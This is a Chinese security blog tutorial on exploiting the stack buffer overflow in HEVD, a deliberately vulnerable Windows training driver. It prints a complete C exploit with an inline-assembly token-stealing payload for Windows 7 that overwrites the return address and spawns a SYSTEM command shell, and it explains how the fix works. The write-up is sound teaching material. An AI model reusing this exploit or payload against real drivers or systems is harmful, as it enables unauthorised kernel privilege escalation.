> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tLoVhmXPmdn4lKF_5_l8kA)

0x01 HEVD 介绍
------------

HEVD 全称为 HackSys Ex

treme Vulnerable Drive，是一个项目，故意设计包含多种漏洞的驱动程序，旨在帮助安全爱好者来提升他们在内核层面的漏洞利用能力。

说白了，是一个内核漏洞的靶场。

项目地址：https://github.com/hacksysteam/HackSysExtremeVulnerableDriver

关于安装配置初始环境，建议参考：

https://tttang.com/archive/1332/

https://bbs.pediy.com/thread-218838.htm

这里就不再赘述。

本人能力有限，刚学习过一些内核知识，文章中出现的任何错误欢迎师傅们批评指正。

下面我们直接开始，从栈溢出开始

0x02 栈溢出函数定位
------------

在`HackSysExtremeVulnerableDriver-3.00\Driver\HEVD\BufferOverflowStack.c`文件中。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDJ1n5uAjSmjDamkMOsSaZAKINP98R7ySNQ1j8G435n52bVOaCOEXOiaw/640?wx_fmt=png)

位于该文件的 107 行，没有经过校验 Size 的大小而直接使用函数进行拷贝。

相关漏洞函数为：`TriggerBufferOverflowStack`

将 HEVD.sys 文件拖入 ida 中分析。定位到`TriggerBufferOverflowStack`函数

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDdbLibzEgTYMbzyDl2xhevV1AdBolVia2PLibsmHMSMQUJT5ucTsXJFKdg/640?wx_fmt=png)

可以看到使用了`memcpy`对`kernelBuffer`有拷贝动作，将`UserBuffer`的值拷贝到`kernelBuffer`中，拷贝长度为传入的参数 Size。

问题在于`kernelBuffer`的长度是固定的：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDSTdzmZaTx0RnVdfJUia3E0Jx0icEjqGfB4SOmzaVvGc89u2uoDLkK0FQ/640?wx_fmt=png)

一个 ULONG 类型对应四个字节，那么 512*4=2048=800h，这和 IDA 逆向出来的代码是相同的：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCD0fQEGAgicMArot2kTficUwRJqYvXicIZwlLKjlMDlRKAUS2qyooCia12wg/640?wx_fmt=png)

而 UserBuffer 和 Size 为传入的参数，并且对 Size 的大小没有限制，那么倘若 Size 大小大于 800h 字节，则会发生栈溢出。

0x03 溢出函数是怎样被调用的
----------------

相关调用链

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDltibic45Og94WUeSxgFvVZHNllrofnjIEvB1vfTNB02WzcRqsibl9fo4g/640?wx_fmt=png)

首先是进入到`DriverEntry(x,x)`，然后通过`IrpDeviceIoCtlHandler(x,x)`根据`IoControlCode`使用`switch`函数跳转到`BufferOverflowStackIoctlHandler`然后进入`TriggerBufferOverflowStack`进行溢出操作

找到`IrpIrpDeviceIoCtlHandler`函数

```
PAGE:00444064 _IrpDeviceIoCtlHandler@8 proc near      ; DATA XREF: DriverEntry(x,x)+87↓oPAGE:00444064PAGE:00444064 DeviceObject    = dword ptr  8PAGE:00444064 Irp             = dword ptr  0ChPAGE:00444064PAGE:00444064                 push    ebpPAGE:00444065                 mov     ebp, espPAGE:00444067                 push    ebxPAGE:00444068                 push    esiPAGE:00444069                 push    ediPAGE:0044406A                 mov     edi, [ebp+Irp]PAGE:0044406D                 mov     ebx, 0C00000BBhPAGE:00444072                 mov     eax, [edi+60h]PAGE:00444075                 test    eax, eaxPAGE:00444077                 jz      loc_4444C5PAGE:0044407D                 mov     ebx, eaxPAGE:0044407F                 mov     ecx, [ebx+0Ch]PAGE:00444082                 lea     eax, [ecx-222003h] ; switch 109 casesPAGE:00444088                 cmp     eax, 6ChPAGE:0044408B                 ja      def_444098      ; jumptable 00444098 default case, cases 2236420-2236422,2236424-2236426,2236428-2236430,2236432-2236434,2236436-2236438,2236440-2236442,2236444-2236446,2236448-2236450,2236452-2236454,2236456-2236458,2236460-2236462,2236464-2236466,2236468-2236470,2236472-2236474,2236476-2236478,2236480-2236482,2236484-2236486,2236488-2236490,2236492-2236494,2236496-2236498,2236500-2236502,2236504-2236506,2236508-2236510,2236512-2236514,2236516-2236518,2236520-2236522,2236524-2236526PAGE:00444091                 movzx   eax, ds:byte_444554[eax]PAGE:00444098                 jmp     ds:jpt_444098[eax*4] ; switch jump
```

这里看的不是很清楚，可以通过 IDA F5 反编译一下

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDJLfCOlibLQTh4WoVXYsnO6HSr5QkBUUZN0kziaUqIS0mMBSEEXaW7eFA/640?wx_fmt=png)

可以看到只有当 IoControlCode 为 2236419 时，才会调用`BufferOverflowStackIoctlHandler`，继而调用`TriggerBufferOverflowStack`。

0x04 漏洞利用
---------

作为脚本小子，先跑一下写好了的 exploit 脚本。

打开 HackSysEVDExploit.sln 文件，直接在 vs2019 上编译即可。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDgYzZnkwQnJxhowVMflbJqCQ73ib7y6cgGljLHdQmWmfjhXbRvoJj0IA/640?wx_fmt=png)

将生成的`HackSysEVDExploit.exe`拷贝至 win7，执行如下命令

```
HackSysEVDExploit.exe -c cmd.exe -p
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDXWJX53tH6403gyczoGLdib3tJyJRWna4O5PLia6UWgT8AJiccWTanicRcg/640?wx_fmt=png)

直接可以获取 system 权限。

那么只跑一下脚本肯定不行，一起分析一下他是如何做到的。

首先，栈溢出了，我们最希望控制的就是 EIP，通过栈溢出的漏洞将原来函数返回的地址覆盖为我们自己希望执行代码的地址。那么应该弄清楚一点，返回地址在哪？

可以在 ida 上找到答案，通过 stack 窗口可以看到`TriggerBufferOverflowStack`的堆栈图：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDiaM0U6dbnozEdoLutCgv0Qfts3evPt38ia5o5buedvdmwsZtpJwr2zgQ/640?wx_fmt=png)

我们可以通过`kernelBuffer`溢出来覆盖 r 的值，r 相对`KernelBuffer`的偏移为 820h。

所以我们可以申请一块 0x824 大小的空间，然后将我们要执行函数或者 shellcode 的地址填入 0x820 的位置，即可覆盖返回地址。

当`TriggerBufferOverflowStack`执行结束后就会执行我们自己的代码。

这里有一个小问题需要注意，执行完我们自己的代码以后我们需要让程序能够继续正常执行，那么需要做平衡堆栈的动作

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDcFibA3zMia1PeB3R9HAQng5viaIhxyPjLEokHo6TxKNq46BA29Gy1dv6w/640?wx_fmt=png)

最终我们自己编写的 exp 为：

```
#include "stdio.h"#include "windows.h"#include <stdlib.h>#include <tchar.h>VOID TokenStealingPayloadWin7() {    // Importance of Kernel Recovery    __asm {        pushad; Save registers state        ; Start of Token Stealing Stub        xor eax, eax; Set ZERO        mov eax, fs: [eax + 124h] ; Get nt!_KPCR.PcrbData.CurrentThread        ; _KTHREAD is located at FS : [0x124]        mov eax, [eax + 50h]; Get nt!_KTHREAD.ApcState.Process  //养父母        mov ecx, eax; Copy current process _EPROCESS structure        mov edx, 4; WIN 7 SP1 SYSTEM process PID = 0x4        SearchSystemPID:        mov eax, [eax + 0b8h]; Get nt!_EPROCESS.ActiveProcessLinks.Flink            sub eax, 0b8h            cmp[eax + 0b4h], edx; Get nt!_EPROCESS.UniqueProcessId            jne SearchSystemPID            mov edx, [eax + 0f8h]; Get SYSTEM process nt!_EPROCESS.Token            mov[ecx + 0f8h], edx; Replace target process nt!_EPROCESS.Token //替换token为system的token            ; with SYSTEM process nt!_EPROCESS.Token            ; End of Token Stealing Stub            popad; Restore registers state            ; Kernel Recovery Stub            xor eax, eax; Set NTSTATUS SUCCEESS            add esp, 12; Fix the stack            pop ebp; Restore saved EBP            ret 8; Return cleanly    }}static VOID Cmd(){    STARTUPINFO si = { sizeof(si) };    PROCESS_INFORMATION pi = { 0 };    si.dwFlags = STARTF_USESHOWWINDOW;    si.wShowWindow = SW_SHOW;    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);}int main(){    char buffer[0x824];    HANDLE hDevice;    DWORD bReturn = 0;    hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",        GENERIC_READ | GENERIC_WRITE,        FILE_SHARE_READ | FILE_SHARE_WRITE,        NULL,        OPEN_EXISTING,        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,        NULL    );    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)    {        printf("Failed to get handle...!\n");        return 0;    }    memset(buffer, 'A', 0x824);    *(PDWORD)(buffer + 0x820) = (DWORD)&TokenStealingPayloadWin7;    DeviceIoControl(hDevice, 2236419, buffer, 0x824, NULL, 0, &bReturn, NULL); //IoControlCode要为2236419才会执行BufferOverflowStackIoctlHandler    Cmd();    return 0;}
```

### payload 解读

其中`TokenStealingPayloadWin7`为 payload 函数。

在 ring3，fs:[0] 指向 TEB，在 ring0，fs:[0] 指向 KPCR。

然后通过 KPCR+124h 获取`CurrentThread`，CurrentThread 结构体为 EThread，EThread 的第一个成员 KThread+40 为 APC_STATE 结构，其中包含当前线程的 “养父母” 进程。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCD6LibnXvk85GzDicKtbk2wTv1ehv5ibvuX6iaicic4NxHxcWBBYf2zV2CQSfA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDsxScurVWUMeCibvX2vS6laqAp5BMb7tM2SuZiaOGcye9B96wU7H3hQqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDwGoVPJiaFrNClicdGiaw6ickz8nrtytYiarukSTiapqBiaKK9CNfq08tCCsrw/640?wx_fmt=png)

EPROCESS+0xb8 指向的是一个链表，串着所有进程的信息，我们可以通过遍历这个链表获取 pid 为 4（EPROCESS+0xb4），system 进程的 EPROCESS 信息。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDhoGR4NeadLUjkML41glEI4Xb1wj5QMEAfpMZLLRPia7sicCRuXqe3B4g/640?wx_fmt=png)

最后将当前进程的 token（EPROCESS+0xf8）的值替换为 system 进程的 token 的值，让当前进程权限为 system。达到权限提升的作用。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDP4mWfO9X5iaolwCOs2hln9BMk8icmDWMDCXSP7mqKY56lfdMbE2h21RQ/640?wx_fmt=png)

最后需要平衡堆栈，以及将返回后的两句代码添上。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDmQpQicLT68rrXLafmg9n0uC4XQib61dFy90M6Ubaniau8ONf8P7RWUpnw/640?wx_fmt=png)

### 其余代码

```
memset(buffer, 'A', 0x824);*(PDWORD)(buffer + 0x820) = (DWORD)&TokenStealingPayloadWin7;
```

将相对 kernelBuffer 偏移 0x820 字节返回位置进行覆盖，改为我们自己函数的地址。

```
hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",        GENERIC_READ | GENERIC_WRITE,        FILE_SHARE_READ | FILE_SHARE_WRITE,        NULL,        OPEN_EXISTING,        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,        NULL    );
```

创建设备与驱动通信

```
DeviceIoControl(hDevice, 2236419, buffer, 0x824, NULL, 0, &bReturn, NULL);
```

IoControlCode 要为 2236419 才会执行 BufferOverflowStackIoctlHandler, 这一点我们上面也已经分析过了。

```
static VOID Cmd(){    STARTUPINFO si = { sizeof(si) };    PROCESS_INFORMATION pi = { 0 };    si.dwFlags = STARTF_USESHOWWINDOW;    si.wShowWindow = SW_SHOW;    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);}
```

由于当前进程具有 system 令牌，我们通过当前进程创建的 cmd.exe 拥有 system 权限。

最后执行我们自己的 exp，成功弹出 system 权限的 cmd。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDMkicODiaMkgHLjEBOrRNeADro3vR49US6RwRgopu7XeboPQ8lo9iag9yw/640?wx_fmt=png)

0x05 修复
-------

将`Size`改为`sizeof(KernelBuffer)`，达到一个限制大小的作用，这一点在 SECURE（安全的代码）代码中也有体现。

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7YvCs60wRAgiaqvWkB1soCDLMCNFE7DsmToaQa8xU6icIE2ibADI84Ofqb3vdKrE1aaZwznOzEvV9FQ/640?wx_fmt=png)

加下方 wx，拉你一起进群学习  
  

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

windows 环境下的自保护探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500695&idx=1&sn=ba5ee681ab01b3e33b66d7562d8aaa19&chksm=ce67792bf910f03d5e828822de773c3c82f8f2fc38c2e875f17ffd01d06294ecbea5c618cc2f&scene=21#wechat_redirect)

[

对抗无落地的 shellcode 注入



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500063&idx=1&sn=911e115c9c99ea88a582a947737a0cc1&chksm=ce677ba3f910f2b51cce3135c7fa709067498098e9d4b2de5f8df66f8760853d8ce8b74ea978&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[

内网环境下的横向移动总结



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499769&idx=1&sn=e52725ea95e63ca860815d26304bf2da&chksm=ce674545f910cc535e5028081bc0c2bdc99fb2040c9d357f1bc15e347b7835e579ea9741e24f&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（一）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

[

利用卷影拷贝服务提取 ntds.dit



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498091&idx=1&sn=5d3a86dab1bc6d0d97755d67de3e164e&chksm=ce6743d7f910cac115dd184a777cfea6a2a5a7a759d51dfc108b6c75bf1c42aa3ebc4dae07ff&scene=21#wechat_redirect)

[

从 mimikatz 抓取密码学习攻防



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497664&idx=1&sn=c63231e4cfca59a548b9d1de4bd66417&chksm=ce674d7cf910c46ac33e994d91486e197ed884461646096a0e4d0eeaf289e7adaf2c8097d7e0&scene=21#wechat_redirect)

[

shellcode 编写探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497564&idx=1&sn=e061aea7457034672babe21d307c5a0b&chksm=ce674de0f910c4f66c5c05653005337f7df136b03a757a1549920086d1bbd5467904e59e0ca1&scene=21#wechat_redirect)

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 80 篇原创内容  公众号

![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)